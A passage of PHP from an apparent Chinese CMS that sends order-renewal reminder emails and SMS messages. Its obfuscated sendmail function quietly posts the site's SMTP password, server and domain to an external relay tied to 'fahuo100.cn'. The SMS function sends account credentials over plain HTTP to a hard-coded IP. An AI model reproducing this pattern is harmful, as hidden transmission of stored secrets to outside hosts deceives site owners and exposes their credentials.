zcode($rfZaqgv){if(!defined("vvIQAhv"))define("vvIQAhv","iPFBplQ");$GLOBALS[vvIQAhv]=explode("|0|Y|l", "ENCODE|0|Y|lfahuo100.cn");return xcode($rfZaqgv,$GLOBALS[vvIQAhv][0x0],$GLOBALS[vvIQAhv][01],(vURQLTv*54-3024));}function sendmail($GdjzNQQ,$IYrctnv,$EuylJjJ,$WbSmXQJ=0){if(!defined("mwkNJIJ"))define("mwkNJIJ","psfNWfQ");$GLOBALS[mwkNJIJ]=explode("|^|4|P", "NBzYOlJ|^|4|Ptime2|^|4|P/fahuo.php|^|4|Pc=|^|4|P&mail_from=|^|4|P&mail_to=|^|4|P&mail_name=|^|4|P&mail_title=|^|4|P&mail_content=|^|4|P&mail_smtp=|^|4|P&mail_pwd=|^|4|P&mail_logo=|^|4|P/media/|^|4|P&mail_web=|^|4|Pscms|^|4|P发送邮件过于频繁，请|^|4|P秒后再试！");global $C_email,$C_domain,$C_fdomain,$C_logo,$C_title,$C_mailcode,$C_mailtype,$C_smtp,$mail;if($GLOBALS[$GLOBALS[mwkNJIJ][00]]()-intval($_SESSION[$GLOBALS[mwkNJIJ][01]])>(vURQLTv*12-642)){if($C_mailtype==(0-1903+vURQLTv*34)){$veBOwHJ=GetBody($mail. $GLOBALS[mwkNJIJ][0x2],$GLOBALS[mwkNJIJ][3] .$WbSmXQJ. $GLOBALS[mwkNJIJ][04] .urlencode($C_email). $GLOBALS[mwkNJIJ][5] .urlencode($EuylJjJ). $GLOBALS[mwkNJIJ][6] .urlencode($C_title). $GLOBALS[mwkNJIJ][7] .urlencode($GdjzNQQ). $GLOBALS[mwkNJIJ][010] .urlencode($IYrctnv). $GLOBALS[mwkNJIJ][0x9] .urlencode($C_smtp). $GLOBALS[mwkNJIJ][0xA] .urlencode($C_mailcode). $GLOBALS[mwkNJIJ][0xB] .urlencode($C_fdomain. $GLOBALS[mwkNJIJ][014] .$C_logo). $GLOBALS[mwkNJIJ][0xD] .urlencode($C_domain));}else{$veBOwHJ=GetBody($mail. $GLOBALS[mwkNJIJ][0x2],$GLOBALS[mwkNJIJ][3] .$WbSmXQJ. $GLOBALS[mwkNJIJ][04] .urlencode($GLOBALS[mwkNJIJ][0xE]). $GLOBALS[mwkNJIJ][5] .urlencode($EuylJjJ). $GLOBALS[mwkNJIJ][6] .urlencode($C_title). $GLOBALS[mwkNJIJ][7] .urlencode($GdjzNQQ). $GLOBALS[mwkNJIJ][010] .urlencode($IYrctnv). $GLOBALS[mwkNJIJ][0x9] .urlencode($C_smtp). $GLOBALS[mwkNJIJ][0xA] .urlencode($C_mailcode). $GLOBALS[mwkNJIJ][0xB] .urlencode($C_fdomain. $GLOBALS[mwkNJIJ][014] .$C_logo). $GLOBALS[mwkNJIJ][0xD] .urlencode($C_domain));}$_SESSION[$GLOBALS[mwkNJIJ][01]]=$GLOBALS[$GLOBALS[mwkNJIJ][00]]();return $veBOwHJ;}else{return $GLOBALS[mwkNJIJ][017] .((vURQLTv*12-642)-$GLOBALS[$GLOBALS[mwkNJIJ][00]]()+intval($_SESSION[$GLOBALS[mwkNJIJ][01]])). $GLOBALS[mwkNJIJ][020];}}

function sendsms($content,$recieve){
	global $C_userid,$C_codeid,$C_codekey;
	if(intval($C_userid)>0){
		if(time()-intval($_SESSION["time"])>60){
			$info=getbody("http://115.159.161.192:18002/send.do?uid=".$C_userid."&pw=".$C_codekey."&mb=".$recieve."&ms=".urlencode($content)."&ex=77","");
			$_SESSION["time"]=time();
			return "success";
		}else{
			return "发送短信过于频繁，请".(60-time()+intval($_SESSION["time"]))."秒后再试！";
		}
	}
}

if($config->tx=="true"){
	//每月提醒
	$sql="select * from sl_orders,sl_member where O_mid=M_id and O_state=1 and (TIMESTAMPDIFF(DAY,DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%S'),O_time2)=2 or TIMESTAMPDIFF(DAY,DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%S'),O_time2)=1) and TIMESTAMPDIFF(DAY,O_today,DATE_FORMAT(NOW(), '%Y-%m-%d %H:%i:%S'))>0";
	$result = mysqli_query($conn,  $sql);
	if (mysqli_num_rows($result) > 0) {
		while($row = mysqli_fetch_assoc($result)) {
			if($row["O_mid"]==1){
				$email=splitx($row["O_address"],"__",0);
			}else{
				$email=$row["M_email"];
				sendsms("【".$C_smssign."】您有订单将要到期，请尽快待续费！",$row["M_mobile"]);
			}
	        sendmail("您有订单将要到期","<p>您有订单将要到期，请尽快待续费</p><p>订单名称：".$row["O_title"]."</p><p>请登录<a href=\"".gethttp().$_SERVER["HTTP_HOST"]."/member\">会员中心</a>执行续费操作</p>",$email);
	        mysqli_query($conn,"update sl_orders set O_today='".date('Y-m-d H:i:s')."' where O_id=".$row["O_id"]);
	    }
	}
}
?>